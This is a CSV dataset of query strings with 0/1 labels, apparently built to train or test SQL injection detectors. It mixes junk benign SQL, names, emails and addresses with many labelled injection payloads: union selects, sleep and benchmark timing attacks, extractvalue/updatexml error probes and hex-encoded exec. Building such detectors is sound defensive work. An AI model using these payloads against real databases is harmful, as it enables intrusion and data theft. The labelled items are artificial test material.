query,label
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'ucpa'  =  'ucpa,1
"1'+  (  select dgnt where 4701  =  4701 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"-7388""  )   as rlth where 5746  =  5746 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1%""   )    )    and 8316  =  6410#",1
select mix ( s )  from solar union,0
timb44,0
select option_value from wp_options where option_name  =  'houzez_settings' limit 1,0
select avg ( train ) from park,0
select * from object,0
retasac5n,0
21840329n,0
-3566%' or 2158  =  6289,1
6.50345e+15,0
2293,0
select avg ( courage ) from daughter,0
soussa,0
palau-saverdera,0
select count ( perfect ) from captain,0
select * from serious 3 select * from similar,0
"-1844'  )   union all select 9572,9572,9572,9572#",1
select top 3 * from ago select * from found 3select * from mostly,0
-2658  )   as casi where 7364  =  7364 or 8245  =  9651--,1
delete from half,0
select friend ( s from month right join,0
barriga requena,0
select min ( it )  as pitch from dinner,0
"1 where 8273  =  8273 union all select null,null,null,null,null,null,null,null#",1
"select * from worth order by oxygen, follow",0
select   (  case when   (  7254  =  5901  )   then 1 else 7254*  (  select 7254 from master..sysdatabases  )   end  )  --,1
"update newspaper set wherever =  'unit', city =  'captured' where went =  slight",0
alg59za,0
select * from spite fetch first 3 rows only select top 50 percent * from describe,0
select * from customers  where city = 'berlin' or city = 'münchen';,0
select * from neck where his between 'toward' and 'shelf',0
"select orders.nearlyrid, employees.suppose, employees.balance from ordersright join employees on orders.employeeid  =  employees.provideid order by orders.tapeid",0
"1  )   where 1185  =  1185 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
select * from chain  where alive not like '[recent]%',0
select * from sudden fetch first 50 percent rows onlyselect top 3 * from soldier,0
"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )",1
select * from paint where century between 'change' and 'selection',0
"-3461""   )    )    union all select 6342,6342,6342,6342,6342,6342#",1
1'  ),1
select * from team where corn = 'lose' limit 3,0
"1'  )   as jrwx where 6087  =  6087 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
select yard from twelve union all select health from friendly order by food,0
select * from local where    not winter = 'region',0
"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",1
select hard ( s )  from off full outer join,0
"select recently,setting from century where be = 'solve' union select avoid, addition from front",0
select avg ( sea ) from differ select sum ( carefully ),0
"select * from helpful order by new, new",0
select * from herd where not myself = 'hold'  and not control = 'mission',0
select * from spin where not system = 'allow'  and not law = 'current',0
"1'  )   union all select null,null#",1
"-9672%""   )    )     )   order by 1#",1
salma,0
"select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1
persson_mcclanahan@deseoun.km,0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 287 )  order by meta_id asc",0
harvison,0
964,0
"-1737' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'fsmd'  =  'fsmd",1
"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",1
1%'   )    )    and 1651  =  9324 and    (    (   '%'  =  ',1
select variety ( s ) from choice inner join,0
"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,1
select * from orange order by package desc,0
select * from wp_posts where  ( post_type  =  'page' and post_status  =  'publish' )  order by wp_posts.post_title asc,0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 9347 )  order by meta_id asc",0
"1"" where 6352  =  6352",1
"-3059 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )",1
-4617'   )    )     )   or 9323  =  9323#,1
select * from journey,0
"1""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""stcv""  =  ""stcv",1
1'||  (  select 'brde' where 7390  =  7390 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',1
calle capitan palacios 71,0
select count ( write ) from poet,0
"select column_name ( s )  from goes,differ",0
select * from greatest where tank = 'grow'  and city = 'upper',0
sedran,0
"1%""   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""%""  =  """,1
ru5runears2,0
"1""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""hkjm"" like ""hkjm",1
armenteros,0
falset,0
delete from orange where dream = 'sold',0
’ or ‘1’  =  ’1,1
select avg ( price ) from together,0
select * from automobile 3,0
"select broad, blank+ ', ' + alike+ ' ' + managed+ ', ' + smallest as dangerous  from meet",0
update sink set fastened = 'shaking'where conversation = 'storm',0
"1   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
desnuda,0
)   or   (  'x'  )    =    (  'x,1
select * from  ( select minute from lake ),0
1'||  (  select 'jmao' where 3009  =  3009,1
delete from goose where note = 'announced',0
delete from window where gas = 'tube',0
"select herself,familiar,excellent,proud,volume     (  (  believed join rate on character.count =  bound.ride )   inner join clotheson orders.valley =  throat.westernid )",0
"palomares, 2 11b",0
"-3177'   )    )    union all select 6500,6500,6500,6500,6500,6500,6500,6500,6500--",1
"1'   )    )    as kxek where 3429  =  3429 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
1'||  (  select 'aioq' from dual where 8176  =  8176,1
"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'qeet'  =  'qeet",1
select * from sweet fetch first 50 percent rows only,0
select * from recently 3,0
"select orders.mostrid, employees.plenty, employees.herself from ordersright join employees on orders.employeeid  =  employees.summerid order by orders.fairlyid",0
select * from pretty,0
"calle muelles, 70, 6g",0
axman@culturalsanpedrocf.ie,0
select mountain ( s )  from shoe select believed ( s ),0
select * from dog where gulf between '1996-07-01' and '1996-07-31',0
select * from mostly where thought = 'got'  and city = 'say',0
select option_value from wp_options where option_name  =  'zcf_crmformswpbuilder_settings' limit 1,0
"1%""   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
1   )    )    as bvij where 7913  =  7913,1
"1'||  (  select 'xyrk' from dual where 9844  =  9844 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
select * from general where easy  between 10 and 20,0
"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",1
delete from enemy,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",1
select * from swim where ship not like '[suppose]%',0
23130,0
select * from mouth order by needs,0
"select * from users where id  =  1 + \+%1 union select null,@@version -- 1",1
1' rlike   (  select   (  case when   (  5567  =  5586  )   then 1 else 0x28 end   )    )    and 'mmnb'  =  'mmnb,1
"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""bely""  =  ""bely",1
1'+  (  select 'hplm' where 4008  =  4008 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
boix machiavelli,0
mendiz espn,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""%""  =  """,1
select * from identity where burn between '1996-07-01' and '1996-07-31',0
"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )",1
select * from cost where kill = 'stick'  or poetry = 'wore',0
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",1
select * from belong 3,0
select * from soldier order by catch desc,0
pernign,0
"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",1
luczka graciot,0
12370442f,0
"1%'   )    )     )   union all select null,null,null,null,null--",1
"-2715'   )    )    union all select 8646,8646,8646,8646,8646,8646,8646,8646--",1
select * from share where curious between 'better' and 'office',0
1'   )    )    as egsj where 3447  =  3447,1
"1'||  (  select 'frrk' from dual where 3145  =  3145 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  ||'",1
villodrigo,0
-6014'   )    )    or   (  9860  =  4848  )  *4848 and    (    (   'qtge'  =  'qtge,1
"1 where 2031  =  2031 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
tas9go,0
"select orders.seldomrid, employees.occur, employees.income from ordersright join employees on orders.employeeid  =  employees.weekid order by orders.cowboyid",0
select database (  ) ;,0
"1'   )    )    union all select null,null,null,null,null,null#",1
silvie,0
1'   )    )    as dago where 9788  =  9788,1
select depend ( s )  from larger left join,0
-6423'  )   or 6872  =  6872,1
6e665a,0
"select announced,noon from beginning where brown = 'cave' union select foot, quiet from rabbit",0
"1%""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""%""  =  """,1
select * from till  where certain = leaf,0
1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  7015  =  7015,1
14399392n,0
select * from general where half = 'log' fetch first 3 rows only,0
x' and members.email is null; --,1
 or 1  =  1 --,1
select * from arrangement where design = 'sheep' fetch first 3 rows only,0
"update laid set fuel =  'birds', city =  'won' where carbon =  percent",0
select brought from title union select bigger from loose order by period,0
"1"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""utzr"" like ""utzr",1
"1%"" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"c/ nueva fuera, 139 3?g",0
duo_davalos@designworld.cz,0
"-6659'  )   where 1256  =  1256 union all select 1256,1256--",1
yessica,0
select top 3 * from second where region = 'expect' select * from hard,0
"admin"" or ""1""  =  ""1""#",1
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'bxjo' like 'bxjo",1
"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
"select zebra, market, adventure from court where different  is null",0
"-1692'  )   union all select 7074,7074,7074,7074,7074,7074,7074#",1
acho queralt,0
update choose set promised = 'curve'where ocean = 'social',0
"c/ fuente 28,",0
select count ( motion )  from topic,0
select * from whistle order by duck desc,0
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",1
"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1
"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",1
cuevas labradas,0
"-9015%""  )   union all select 6948,6948--",1
"1  )   where 6954  =  6954 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1
select * from save where    not hidden = 'root',0
18517,0
select * from larger order by involved desc,0
23,0
"select employees.vowel, count ( orders.batid )  as enginefrom    ( ordersinner join beauty on orders.tillid  =  employees.pitchid )",0
"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )",1
select count ( spring ) from citizen,0
select * from  ( select worry from goose ),0
57,0
"-9840   )    )    as thod where 4790  =  4790 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
select fight ( s )  from new select everybody ( s ),0
select * from express,0
fe4r0g6ent8,0
update pour set busy = 'sent'where drawn = 'important',0
select * from  ( select bridge from system ),0
"select * from air order by select asc, got desc",0
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  -- ofqd",1
select * from however where wealth in  ( select repeat from engine ),0
"1%'   )    )    and make_set  (  6527  =  9529,9529  )   and    (    (   '%'  =  '",1
select avg ( ants ) from go,0
"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # cqqs",1
chilches/xilxes,0
hemisfero,0
"1   )    )    as nlzg where 1482  =  1482 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
5r32n7,0
select * from zipper where bottle between '1996-07-01' and '1996-07-31',0
select avg ( price ) from dark,0
"select * from brave order by detail asc, wish desc",0
ibdes,0
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )",1
select top 3 * from customerswhere country = 'germany';,0
"select hospital as double, saved as [desk]  from musical",0
or 1  =  1 or ''  =  ',1
biurrun-olcoz,0
"and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1
alcojor larenas,0
kristl@voragolive.vn,0
select full ( s )  from nor left join,0
select * from outer where great between doing09/01/1996kind and image15/31/1996oxygen,0
select * from neighbor,0
"select count ( fish ) , death from natural by grown",0
"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'qgrt'  =  'qgrt",1
select count ( everyone ) from color,0
select * from buffalo,0
select * from seeing where there between '1996-07-01' and '1996-07-31',0
"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'rpiz' like 'rpiz",1
capaz9,0
select * from heat where    not army = 'under',0
"select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",1
"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'ekla'  =  'ekla",1
"update steady set palace =  'exercise', city =  'trick' where cast =  probably",0
"-6407'  )   or elt  (  1631  =  4946,4946  )   and   (  'jpnz'  =  'jpnz",1
keer,0
pujolrs tremosa,0
salina-sonajew@almeriastella.vg,0
"select * from wp_posts where  ( post_type  =  'page' and post_status  =  'publish' )  and post_parent  =  27990 order by wp_posts.post_title asc limit 0,1",0
"1""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
6014,0
select * from halfway fetch first 50 percent rows only,0
select folks ( s )  from loss select might ( s ),0
"select isnull ( """" ) ;",0
select improve ( s )  from cave,0
eisenberg@muchochinoenchina.mx,0
c7o5ologa,0
"select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1
grea,0
79533872x,0
select * from seed,0
"select women,mass,conversation from blind left join orders on reason.lunchid =  instant.corn order by out.thus",0
select youth ( s from constantly right join,0
francisco jorquera s/n 1?d,0
inistola,0
gabbai,0
ren,0
"select fastened,fall from wash where enter = 'play' union select seven, block from certainly",0
"select employees.machine, count ( orders.grewid )  as parallelfrom    ( ordersinner join those on orders.showid  =  employees.propertyid )",0
select * from solid,0
"update daughter set doubt =  'door', city =  'told' where factor =  outline",0
select top 50 percent * from magnet,0
"1'+  (  select llcl where 8188  =  8188 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
oviedo,0
"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5f6c97aab4686' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",0
"1""  )   as nraw where 7984  =  7984 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )",1
01449063v,0
"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )",1
"select * from cotton where kids not in  ( 'within', 'connected', 'pattern' )",0
"select format ( 250500.5634, 2 ) ;",0
1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
select distinct herd from wire,0
select stay ( s ) from product inner join,0
"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",1
select avg ( wood ) from term select sum ( smile ),0
select option_value from wp_options where option_name  =  '_options_linkedin_url' limit 1,0
"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'uwrm'  =  'uwrm",1
olaya,0
5.12832e+15,0
select avg ( river )  from football  select sum ( shade ),0
or 1/*,1
select min ( plastic )  as rocket from earlier,0
select * from within order by came desc,0
select * from title where tired = 'luck' fetch first 3 rows only,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""azzv"" like ""azzv",1
gamal,0
select top 3 * from other select * from fort 3select * from up,0
1' where 6168  =  6168,1
48825670m,0
select count ( * )  as pleasure,0
select * from herself  where wagon not like '[fallen]%',0
1'||  (  select 'zwcp' where 3333  =  3333,1
select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,1
25727,0
select * from  ( select development from traffic ),0
select min ( said )  as deal from statement,0
select managed ( s )  from pupil union all,0
copleston-guerrasio@risiberia.ng,0
"1%' or elt  (  6272  =  6272,sleep  (  5   )    )    and '%'  =  '",1
select * from express where dear = 'sense' limit 3,0
1'  )   where 8204  =  8204,1
5.24225e+13,0
a' or 1  =  1--,1
"c/ comedias, 109,",0
select * from market fetch first 50 percent rows only,0
-8812 or 6872  =  6872# dflr,1
"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nbsr' like 'nbsr",1
sookdeo,0
linton,0
select avg ( ants ) from nothing select sum ( human ),0
select * from large where own between '1996-07-01' and '1996-07-31',0
-9103' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'nlvq'  =  'nlvq,1
select top 50 percent * from settle select * from blank fetch first 50 percent rows onlyselect top 3 * from somehow,0
select although ( s )  from diagram union,0
.raijo,0
"select protectionid as id, conversation as plural from imagine",0
"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",1
"select say,grade,wise,engine,post     (  (  arrangement join date on bright.known =  fish.writing )   inner join teamon orders.even =  tune.morningid )",0
ninon,0
e57ol40,0
select * from bag,0
57317186j,0
"insert into brass  ( continued, stock, to )  values  ( 'compass', 'exciting', 'partly' )",0
1 and 7533  =  7533# absp,1
select * from  ( select instrument from busy ),0
or username like char  (  37  )  ;,1
select count ( distinct stick )  from swimming,0
9.03287e+15,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   3508  =  3508",1
76156835v,0
"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'tblb'  =  'tblb",1
select hay ( s )  from congress union,0
-7636'  )   or 5898  =  8880 and   (  'sjuv'  =  'sjuv,1
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )",1
-4758%'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   '%'  =  ',1
select * from learn fetch first 3 rows only,0
select globe ( s )  from shirt union all,0
"update lying set found =  'quickly', city =  'highest' where clean =  sunlight",0
maragliano serna,0
select distinct hang from sudden,0
"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,1
"1""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""wvkp"" like ""wvkp",1
select * from goes where different = 'catch',0
"select moreid as id, studied as social from movement",0
select heard from single union all select vapor from tail order by solution,0
1.78478e+15,0
select * from announced where price not between 'grass' and 'nose',0
select count ( wise )  from dozen,0
"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",1
"select * from cow where torn between ""butter"" and    ""refused""",0
kangelis,0
update alphabet set colony = 'cutting'where taken = 'stems',0
"-5073""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""kbab"" like ""kbab",1
declare @s varchar  (  200  )   select @s   =   0x77616974666f722064656c61792027303a303a31302700 exec  (  @s  ),1
select * from traffic 3,0
select avg ( successful ) from ride,0
1'+  (  select 'uetb' where 6468  =  6468,1
"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""zvew"" like ""zvew",1
select * from write where silk = 'remain'  and city = 'wait',0
"insert into were  ( tightly, must, house )  values  ( 'weight', 'because', 'mad' )",0
select * from  ( select flew from essential ),0
"-1593' or elt  (  7044  =  6125,6125  )   and 'zkuz'  =  'zkuz",1
select * from widely where offer = 'interior' fetch first 3 rows only,0
"select orders.automobilerid, employees.pure, employees.just from ordersright join employees on orders.employeeid  =  employees.fastid order by orders.richid",0
-4979'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'ofgg'  =  'ofgg,1
"select * from forward where gravity between ""highway"" and    ""happened""",0
select * from chapter where wrapped not between 'completely' and 'single',0
"select my,spoken from record where music = 'cross' union select lion, make from tight",0
"select pg_sleep  (  5  )   and    (    (   ""byhx"" like ""byhx",1
1   )    )    as rbcf where 1053  =  1053,1
select top 3 * from support,0
select * from speed where not wagon = 'throw'  and not distance = 'depth',0
magnin_arne@tiebreak.com.sr,0
select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr,1
"travesia brieva, 171,",0
guilas,0
select * from building where shout not between 'she' and 'round',0
select avg ( rain ) from found,0
update single set view = 'at'where huge = 'made',0
mohandas,0
"-7815' union all select 2638,2638,2638,2638,2638--",1
remo,0
waitfor delay '0:0:5' and   (  'gpqx' like 'gpqx,1
1  )   as fhvb where 4008  =  4008,1
declare @q nvarchar   (  200  )   0x730065006c00650063 ...,1
select top 3 * from sharp select * from quarter 3select * from football,0
"-7271'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'mdtw'  =  'mdtw",1
select * from late where board = 'hurry' limit 3,0
sfiroudi,0
mcallum,0
select min ( deep )  as visitor from early,0
mccowen@esencialser.mn,0
select * from chart fetch first 3 rows only select top 50 percent * from should,0
"1'+  (  select sshu where 3442  =  3442 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1
medel pujolriu,0
1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,1
symen,0
39152269j,0
select * from ourselves,0
zarrapastrosamente,0
select * from sum where cage = 'particular'  or lot = 'each',0
select * from national where salt not like '[bite]%',0
"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lwyo'  =  'lwyo",1
debicki@prestoesesto.hr,0
"select slipped, sister, street from exactly where blood  is null",0
-8625 or 3176  =  2519# fvgl,1
select avg ( eleven )  from seed  select sum ( nodded ),0
"1 where 6040  =  6040 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 347697 )  order by meta_id asc",0
